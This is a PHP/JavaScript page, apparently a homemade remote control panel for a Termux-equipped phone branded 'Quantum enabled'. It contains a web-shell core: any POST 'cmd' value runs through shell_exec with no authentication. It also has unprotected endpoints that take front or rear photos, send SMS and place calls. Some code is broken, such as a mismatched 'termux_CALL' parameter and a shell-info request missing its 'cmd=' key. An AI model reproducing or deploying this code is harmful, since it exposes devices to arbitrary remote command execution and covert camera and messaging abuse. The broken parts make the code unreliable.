<?php
	
	if (ISSET($_POST['cmd'])) {
		$output = preg_split('/[\n]/', shell_exec($_POST['cmd']." 2>&1"));
		foreach ($output as $line) {
			echo htmlentities($line, ENT_QUOTES | ENT_HTML5, 'UTF-8') . "<br>";
		}
		die(); 
	} else if (ISSET($_POST['termux_battery'])) {
		$batfile = fopen("battery","w");
		fwrite($batfile,"1");
		fclose($batfile);
		sleep(6);
		if(file_exists("battery_result")) {
			$html = new DOMDocument(); 
			$html->loadHTMLFile('index.php'); 
			$batfile = fopen("battery_result","r");
			$status = fread($batfile,filesize("battery_result"));
			fclose($batfile);
			$html->getElementById('id_bat_result')->nodeValue = $status;
			$html->saveHTMLFile("index.html");
		} else {
			$id_bat_result = "Unknown";
		}
		die();
	} else if (ISSET($_POST['termux_front_photo'])) {
	    $html = new DOMDocument(); 
		$html->loadHTMLFile('index.php'); 
		$fphotofile = fopen("front_photo","w");
		fwrite($fphotofile,"1");
		fclose($fphotofile);
		sleep(6);
		if(file_exists("front_photo_result")) {
			$id_photo_f_result = "<img src='front_photo_result' style='border: 1px solid #000; max-width:200px; max-height:200px; object-fit:contain' >";
		} else {
			$id_photo_f_result = "Not Available";
		}
		$html->getElementById('id_photo_f_result')->nodeValue = $id_photo_f_result;
		$html->saveHTMLFile("index.html");
		die();
	} else if (ISSET($_POST['termux_rear_photo'])) {
	    $html = new DOMDocument(); 
		$html->loadHTMLFile('index.php');
		$rphotofile = fopen("rear_photo","w");
		fwrite($rphotofile,"1");
		fclose($rphotofile);
		sleep(6);
		if(file_exists("rear_photo_result")) {
			$id_photo_r_result = "<img src='rear_photo_result' style='border: 1px solid #000; max-width:200px; max-height:200px; object-fit:contain' >";
		} else {
			$id_photo_r_result = "Not Available";
		}
		$html->getElementById('id_photo_r_result')->nodeValue = $id_photo_r_result;
		$html->saveHTMLFile("index.html");
		die();
	} else if (ISSET($_POST['termux_sms'])) {
		$smsfile = fopen("send_sms","w");
		fwrite($smsfile,"1 ".$_POST['termux_sms']);
		fclose($smsfile);
		die();
	} else if (ISSET($_POST['termux_call'])) {
		$callfile = fopen("call_phone_number","w");
		fwrite($callfile,"1 ".$_POST['termux_CALL']);
		fclose($callfile);
		die();
	} else if (ISSET($_POST['termux_toggle_torch'])) {
		$torchfile = fopen("torch","w");
		fwrite($torchfile,"1 ");
		fclose($torchfile);
		sleep(6);
		die();
	}
	
?>

<html>
    <head>
        <title></title>
        <style>
            html, body {
                max-width: 100%;
            }
        
            body {
                width: 100%;
                height: auto;
                margin: 0;
                background: #fff;
            }
            
            body, .inputtext {
                font-family: "Lucida Console", "Lucida Sans Typewriter", monaco, "Bitstream Vera Sans Mono", monospace;
                font-size: 12px;
                font-style: normal;
                font-variant: normal;
                font-weight: 400;
                line-height: 20px;
            }
			
			h2 {
				text-align: center;
			}
			
			table {
				font-family: arial, sans-serif;
				border-collapse: collapse;
				width: calc(100% - 10px);
				margin: auto;
			}

			td, th {
				border: 1px solid #dddddd;
				text-align: left;
				padding: 8px;
			}

			tr:nth-child(even) {
				background-color: #dddddd;
			}
        
            .console {
                width: 100%;
                height: 60%;
                margin: auto;
                position: absolute;
                color: #fff;
            }
            
            .output {
                width: auto;
                height: auto;
                position: absolute;
                overflow-y: scroll;
                top: 0;
                bottom: 30px;
                left: 5px;
                right: 5px;
                line-height: 20px;
				background: #000;
				color: #00FF00;
				border: 1px solid #F7FF00;
            }
                                 
            .input form {
                position: relative;
                margin-bottom: 0px;
            }
                     
            .username {
                height: 30px;
                width: auto;
                padding-left: 5px;
                line-height: 30px;
                float: left;
				background: #000;
            }

            .input {
                border: 1px solid #F7FF00;
                width: calc(100% - 10px);
                height: 30px;
                position: absolute;
				margin-left: 5px;
				margin-right: 5px;
                bottom: 0;
            }

            .inputtext {
                width: auto;
                height: 30px;
                bottom: 0px;
                margin-bottom: 0px;
                background: #000;
                border: 0;
                float: left;
                padding-left: 8px;
                color: #fff;
            }
            
            .inputtext:focus {
                outline: none;
            }
			
			.operatearea {
				width: 100%;
                height: auto;
				top: 400px;
                position: relative;
			}

            ::-webkit-scrollbar {
                width: 12px;
            }

            ::-webkit-scrollbar-track {
                background: #101010;
            }

            ::-webkit-scrollbar-thumb {
                background: #303030; 
            }
			
			::-webkit-input-placeholder {
				text-align: center;
			}

			:-moz-placeholder {
				text-align: center;
			}
			
        </style>
    </head>
    <body>
		<h2>Welcome to Vineet's Quantum enabled mobile device!!</h2>
        <div class="console">
            <div class="output" id="output"></div>
            <div class="input" id="input">
                <form id="form" method="GET" onSubmit="sendCommand()">
                    <div class="username" id="username"></div>
                    <input class="inputtext" id="inputtext" type="text" name="cmd" autocomplete="off" autofocus>
                </form>
            </div>
        </div>
		<div class="operatearea">
			<table class="table">
			<tr>
				<th style="text-align:center" colspan="3">Termux Mobile Function</th>
				<th style="text-align:center" colspan="2">Function Result</th>
			</tr>
			<tr>
				<td> Battery </td>
				<form method="post">
					<td style="text-align:center" colspan="2">
						<input type="button" id="id_bat" name="id_bat" value="Get status" onClick="getBatteryStatus()">
					</td>
				</form>
				<td style="align:center" colspan="2">
					<div id="id_bat_result" style="text-align:center"> No Operation !! </div>
				</td>
			</tr>
			<tr>
				<td> Take Photo </td>
				<form method="post">
					<td style="text-align:center;width:20%">
						<input type="button" id="id_photo_f" name="id_photo_f" value="Front" onClick="takeFrontPhoto()">
					</td>
					<td style="text-align:center;width:20%">
						<input type="button" id="id_photo_r" name="id_photo_r" value="Rear" onClick="takeRearPhoto()">
					</td>
				</form>
				<td style="align:center">
					<div id="id_photo_f_result" style="text-align:center"> No Operation !! </div>
				</td>
				<td style="align:center">
					<div id="id_photo_r_result" style="text-align:center"> No Operation !! </div>
				</td>
			</tr>
			<tr>
				<td> Send SMS </td>
				<form method="post">
					<td style="text-align:center" colspan="2">
						<input style="text-align:center" type="text" id="id_sms_number" name="id_sms_number" placeholder="Indian Phone Number">
					</td>
					<td style="text-align:center">
						<input type="button" id="id_sms_send" name="id_sms_send" value="Send" onClick="sendSMS()">
					</td>
				</form>
				<td style="align:center">
					<div id="id_sms_send_result" style="text-align:center"> No Operation !! </div>
				</td>
			</tr>
			<tr>
				<td> Make a call </td>
				<form method="post">
					<td style="text-align:center" colspan="2">
						<input style="text-align:center" type="text" id="id_call_number" name="id_call_number" placeholder="Indian Phone Number">
					</td>
					<td style="text-align:center">
						<input type="button" id="id_call" name="id_call" value="Call" onClick="makeCall()">
					</td>
				</form>
				<td style="align:center">
					<div id="id_call_result" style="text-align:center"> No Operation !! </div>
				</td>
			</tr>
			<tr>
				<td colspan="3"> Toggle Torch </td>
				<form method="post">
					<td style="text-align:center">
						<input type="button" id="id_torch" name="id_torch" value="Toggle" onClick="toggleTorch()">
					</td>
				</form>
				<td style="align:center">
					<div id="id_toggle_torch" style="text-align:center"> No Operation !! </div>
				</td>
			</tr>
			</table>
        </div>
		<script type="text/javascript">
            var username = "";
            var hostname = "";
            var currentDir = "";
            var previousDir = "";
            var defaultDir = "";
            var commandHistory = [];
            var currentCommand = 0;
            var inputTextElement = document.getElementById('inputtext');
            var inputElement = document.getElementById("input");
            var outputElement = document.getElementById("output");
            var usernameElement = document.getElementById("username");
			var batteryStatusResult = document.getElementById("id_bat_result");
			var frontPhotoResult = document.getElementById("id_photo_f_result");
			var rearPhotoResult = document.getElementById("id_photo_r_result");
			var sendSMSNumber = document.getElementById("id_sms_number");
			var sendSMSResult = document.getElementById("id_sms_send_result");
			var callPhoneNumber = document.getElementById("id_call_number");
			var callPhoneNumberResult = document.getElementById("id_call_result");
			var toggleTorchResult = document.getElementById("id_toggle_torch");
			
            getShellInfo();
			setQuantumEnvironment();
			updateInputWidth();
			
            function getShellInfo() {
                var request = new XMLHttpRequest();
                
                request.onreadystatechange = function() {
                    if (request.readyState == XMLHttpRequest.DONE) {
                        var parsedResponse = request.responseText.split("<br>");
                        username = parsedResponse[0];
                        hostname = parsedResponse[1];
                        currentDir =  parsedResponse[2].replace(new RegExp("&sol;", "g"), "/");
                        defaultDir = currentDir;
                        usernameElement.innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"@"+hostname+"</div>:"+currentDir+"#";
                        updateInputWidth();
                    }
                };

                request.open("POST", "", true);
                request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                request.send("echo QuantumUser; echo QuantumSystem; pwd");
            }
			
			function setQuantumEnvironment() {
				var request = new XMLHttpRequest();
				var command = "source /var/www/html/QuantumComputing/bin/activate; python;"
				var originalCommand = command;
                var originalDir = currentDir;
				
				request.onreadystatechange = function() {
                    if (request.readyState == XMLHttpRequest.DONE) {
                        outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# "+originalCommand+"</div><br>" + request.responseText.replace(new RegExp("<br><br>$"), "<br>");
                        outputElement.scrollTop = outputElement.scrollHeight;
                        updateInputWidth();
                    }
                };

                request.open("POST", "", true);
                request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                request.send("cmd="+encodeURIComponent(command));
			}
                        
            function sendCommand() {
                var request = new XMLHttpRequest();
                var command = inputTextElement.value;
                var originalCommand = command;
                var originalDir = currentDir;
                var cd = false;
                
                commandHistory.push(originalCommand);
                switchCommand(commandHistory.length);
                inputTextElement.value = "";

                var parsedCommand = command.split(" ");
                
                if (parsedCommand[0] == "cd") {
                    cd = true;
                    if (parsedCommand.length == 1) {
                        command = "cd "+defaultDir+"; pwd";
                    } else if (parsedCommand[1] == "-") {
                        command = "cd "+previousDir+"; pwd";
                    } else {
                        command = "cd "+currentDir+"; "+command+"; pwd";
                    }
                } else if (parsedCommand[0] == "clear") {
                    outputElement.innerHTML = "";
                    return false;
                } else {
                    command = "cd "+currentDir+"; " + command;
                }
                
                request.onreadystatechange = function() {
                    if (request.readyState == XMLHttpRequest.DONE) {
                        if (cd) {
                            var parsedResponse = request.responseText.split("<br>");
                            previousDir = currentDir;
                            currentDir = parsedResponse[0].replace(new RegExp("&sol;", "g"), "/");
                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+originalDir+"# "+originalCommand+"</div><br>";
                            usernameElement.innerHTML = "<div style='color: #ff0000; display: inline;'>"+username+"@"+hostname+"</div>:"+currentDir+"#";
                        } else {
                            outputElement.innerHTML += "<div style='color:#ff0000; float: left;'>"+username+"@"+hostname+"</div><div style='float: left;'>"+":"+currentDir+"# "+originalCommand+"</div><br>" + request.responseText.replace(new RegExp("<br><br>$"), "<br>");
                            outputElement.scrollTop = outputElement.scrollHeight;
                        } 
                        updateInputWidth();
                    }
                };

                request.open("POST", "", true);
                request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                request.send("cmd="+encodeURIComponent(command));
                return false;
            }
            
            function updateInputWidth() {
                inputTextElement.style.width = inputElement.clientWidth - usernameElement.clientWidth ;
            }
            
            document.onkeydown = checkForArrowKeys;

            function checkForArrowKeys(e) {
                e = e || window.event;

                if (e.keyCode == '38') {
                    previousCommand();
                } else if (e.keyCode == '40') {
                    nextCommand();
                }
            }
            
            function previousCommand() {
                if (currentCommand != 0) {
                    switchCommand(currentCommand-1);
                }
            }
            
            function nextCommand() {
                if (currentCommand != commandHistory.length) {
                    switchCommand(currentCommand+1);
                }
            }
            
            function switchCommand(newCommand) {
                currentCommand = newCommand;

                if (currentCommand == commandHistory.length) {
                    inputTextElement.value = "";
                } else {
                    inputTextElement.value = commandHistory[currentCommand];
                    setTimeout(function(){ inputTextElement.selectionStart = inputTextElement.selectionEnd = 10000; }, 0);
                }
            }
			
			function getBatteryStatus() {
				batteryStatusResult.innerHTML = "Loading...";
				var request = new XMLHttpRequest();
				request.onreadystatechange = function() {
					if (request.readyState == XMLHttpRequest.DONE) {
						
					}
				};
				request.open("POST", "", true);
				request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
				request.send("termux_battery="+encodeURIComponent("1"));
			}
			
			function takeFrontPhoto() {
				frontPhotoResult.innerHTML = "Loading...";
				var request = new XMLHttpRequest();
				request.onreadystatechange = function() {
					if (request.readyState == XMLHttpRequest.DONE) {
						
					}
				};
				request.open("POST", "", true);
				request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
				request.send("termux_front_photo="+encodeURIComponent("1"));
			}
			
			function takeRearPhoto() {
				rearPhotoResult.innerHTML = "Loading...";
				var request = new XMLHttpRequest();
				request.onreadystatechange = function() {
					if (request.readyState == XMLHttpRequest.DONE) {
						
					}
				};
				request.open("POST", "", true);
				request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
				request.send("termux_rear_photo="+encodeURIComponent("1"));
			}
			
			function sendSMS() {
				sendSMSResult.innerHTML = "Processing..."
				var str = sendSMSNumber.value;
				
				if (typeof str === 'string' && str.length === 10) {
					var request = new XMLHttpRequest();
					request.onreadystatechange = function() {
						if (request.readyState == XMLHttpRequest.DONE) {
							sendSMSResult.innerHTML = "SMS request initiated!!";
						}
					};
					request.open("POST", "", true);
					request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
					request.send("termux_sms="+encodeURIComponent(str));
				} else {
					sendSMSResult.innerHTML = "Invalid input!!";
				}	
			}
			
			function makeCall() {
				callPhoneNumberResult.innerHTML = "Processing..."
				var str = callPhoneNumber.value;
				
				if (typeof str === 'string' && str.length === 10) {
					var request = new XMLHttpRequest();
					request.onreadystatechange = function() {
						if (request.readyState == XMLHttpRequest.DONE) {
							callPhoneNumberResult.innerHTML = "CALL request initiated!!";
						}
					};
					request.open("POST", "", true);
					request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
					request.send("termux_call="+encodeURIComponent(str));
				} else {
					callPhoneNumberResult.innerHTML = "Invalid input!!";
				}	
			}
			
			function toggleTorch() {
				toggleTorchResult.innerHTML = "Processing..."
				
				var request = new XMLHttpRequest();
				request.onreadystatechange = function() {
					if (request.readyState == XMLHttpRequest.DONE) {
						toggleTorchResult.innerHTML = "Toggle TORCH request initiated!!";
					}
				};
				request.open("POST", "", true);
				request.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
				request.send("termux_toggle_torch="+encodeURIComponent("1"));
			}
			
            document.getElementById("form").addEventListener("submit", function(event){
                event.preventDefault()
            });
        </script>
    </body>
</html>
